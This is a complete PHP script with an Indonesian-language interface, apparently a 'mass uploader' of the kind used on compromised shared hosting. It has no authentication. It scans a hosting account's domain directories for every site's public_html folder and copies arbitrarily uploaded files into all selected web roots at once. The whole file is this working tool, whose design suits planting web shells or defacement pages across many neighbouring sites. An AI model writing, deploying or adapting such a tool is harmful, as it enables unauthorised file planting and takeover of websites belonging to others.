<?php
/**
 * PHP Mass Uploader & Domain Scanner (Clean Domain Output Version)
 */
error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(300);

$default_path = __DIR__;
$scan_path = $_GET['scan_path'] ?? $default_path;
$response = "";

// Handle Upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $files = $_FILES['files'] ?? null;

    if (!$files || empty($files['name'][0])) {
        $response = "<div style='color:red; background:#3a1d1d; padding:10px;'>Error: Pilih file terlebih dahulu!</div>";
    } else {
        $targets = [];
        if ($action === 'single') {
            $targets[] = trim($_POST['single_dir'] ?? '');
        } elseif ($action === 'mass') {
            if (!empty($_POST['mass_dirs'])) {
                $targets = $_POST['mass_dirs'];
            } elseif (!empty($_POST['manual_dirs'])) {
                $targets = array_filter(array_map('trim', explode("\n", $_POST['manual_dirs'])));
            }
        }

        $log_details = "<ul>";
        $total_success = 0;
        $total_failed = 0;

        foreach ($targets as $dir) {
            // Bersihkan path dan cegah double slash (//)
            $clean_dir = preg_replace('#/+#', '/', $dir);
            $clean_dir = rtrim($clean_dir, '/\\');
            
            // Ekstrak nama domain agar tampil bersih
            $path_parts = explode('/', $clean_dir);
            $domain_name = "";
            if (($key = array_search('domains', $path_parts)) !== false && isset($path_parts[$key + 1])) {
                $domain_name = $path_parts[$key + 1];
            } else {
                $domain_name = basename($clean_dir);
            }

            // Output hanya menampilkan nama domain dan file yang di-upload
            $log_details .= "<li><strong>Domain:</strong> <span style='color:#00bcd4;'>{$domain_name}</span><br>";

            // Cek apakah direktori ada & buat jika belum
            if (!is_dir($clean_dir)) {
                @mkdir($clean_dir, 0755, true);
            }

            if (is_dir($clean_dir) && is_writable($clean_dir)) {
                for ($i = 0; $i < count($files['name']); $i++) {
                    $tmp_name = $files['tmp_name'][$i];
                    if ($tmp_name && file_exists($tmp_name)) {
                        $file_name = basename($files['name'][$i]);
                        $dest = $clean_dir . '/' . $file_name;

                        // Gunakan copy() agar bisa disalin massal
                        if (copy($tmp_name, $dest)) {
                            $log_details .= "&nbsp;&nbsp;&nbsp;- Berhasil Upload File: <strong style='color:#4ecca3;'>{$file_name}</strong><br>";
                            $total_success++;
                        } else {
                            $log_details .= "&nbsp;&nbsp;&nbsp;- Gagal copy file: <span style='color:#ff5252;'>{$file_name}</span><br>";
                            $total_failed++;
                        }
                    }
                }
            } else {
                $log_details .= "&nbsp;&nbsp;&nbsp;- <b style='color:#ff5252;'>Gagal:</b> Folder tidak ditemukan atau Permission Denied!<br>";
                $total_failed += count($files['name']);
            }
            $log_details .= "</li><br>";
        }
        $log_details .= "</ul>";

        $response = "<div style='background:#222; padding:15px; border:1px solid #444;'>
                        <h4 style='margin:0 0 10px 0; color:#4ecca3;'>Hasil Eksekusi Upload:</h4>
                        Total Berhasil: <b>$total_success</b> | Total Gagal: <b>$total_failed</b>
                        $log_details
                     </div>";
    }
}

// Fungsi Scan Folder Domain
function scanDomains($path) {
    $results = [];
    if (is_dir($path)) {
        $handle = opendir($path);
        if ($handle) {
            while (false !== ($entry = readdir($handle))) {
                if ($entry === '.' || $entry === '..') continue;
                $full_path = $path . '/' . $entry;
                
                if (is_dir($full_path)) {
                    $pub_html = $full_path . '/public_html';
                    if (is_dir($pub_html)) {
                        $results[] = $pub_html;
                    } else {
                        $results[] = $full_path;
                    }
                }
            }
            closedir($handle);
        }
    }
    return $results;
}

$scanned_folders = [];
if (isset($_GET['scan']) && $_GET['scan'] == '1') {
    $scanned_folders = scanDomains($scan_path);
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Mass Uploader & Clean Domain Output</title>
    <style>
        body { font-family: sans-serif; background: #1e1e1e; color: #fff; padding: 20px; }
        .box { background: #2d2d2d; padding: 20px; border-radius: 6px; max-width: 900px; margin: auto; }
        input, textarea, button { width: 100%; padding: 8px; margin-top: 5px; margin-bottom: 15px; background: #333; color: #fff; border: 1px solid #555; box-sizing: border-box; }
        button { background: #007bff; border: none; cursor: pointer; font-weight: bold; }
        button:hover { background: #0056b3; }
        .checkbox-list { max-height: 250px; overflow-y: auto; background: #1a1a1a; padding: 10px; border: 1px solid #444; }
        .checkbox-list label { display: block; margin-bottom: 5px; font-weight: normal; }
    </style>
</head>
<body>
<div class="box">
    <h2>PHP Mass Uploader & Domain Scanner</h2>
    <?php echo $response; ?>

    <form action="" method="POST" enctype="multipart/form-data" style="margin-top: 20px;">
        <label>Pilih File untuk Diupload (Bisa Banyak):</label>
        <input type="file" name="files[]" multiple required>

        <hr style="border-color: #444;">

        <h3>1. Scan Direktori / Domain Hosting</h3>
        <label>Path Root Direktori (Contoh: /home/u251307397/domains):</label>
        <div style="display: flex; gap: 10px;">
            <input type="text" name="scan_path_input" id="scan_path_input" value="<?php echo htmlspecialchars($scan_path); ?>">
            <button type="button" onclick="location.href='?scan=1&scan_path=' + encodeURIComponent(document.getElementById('scan_path_input').value)" style="width: 150px;">Scan Folder</button>
        </div>

        <?php if (!empty($scanned_folders)): ?>
            <input type="hidden" name="action" value="mass">
            <label>Hasil Scan (Centang target direktori massal):</label>
            <div class="checkbox-list">
                <div style="margin-bottom: 5px;"><input type="checkbox" id="select-all" onclick="toggleAll(this)"> <b>Pilih Semua</b></div>
                <?php foreach ($scanned_folders as $folder): ?>
                    <label><input type="checkbox" name="mass_dirs[]" value="<?php echo htmlspecialchars($folder); ?>"> <?php echo htmlspecialchars($folder); ?></label>
                <?php endforeach; ?>
            </div>
            <button type="submit" style="margin-top: 15px; background: #28a745;">Upload ke Folder Terpilih</button>
        <?php else: ?>
            <input type="hidden" name="action" value="single">
            <label>Target Single Direktori (Manual):</label>
            <input type="text" name="single_dir" placeholder="/home/u251307397/domains/namadomain.com/public_html">
            <button type="submit" style="background: #28a745;">Upload File</button>
        <?php endif; ?>
    </form>
</div>

<script>
function toggleAll(source) {
    var checkboxes = document.querySelectorAll('input[name="mass_dirs[]"]');
    for(var i=0; i<checkboxes.length; i++) {
        checkboxes[i].checked = source.checked;
    }
}
</script>
</body>
</html>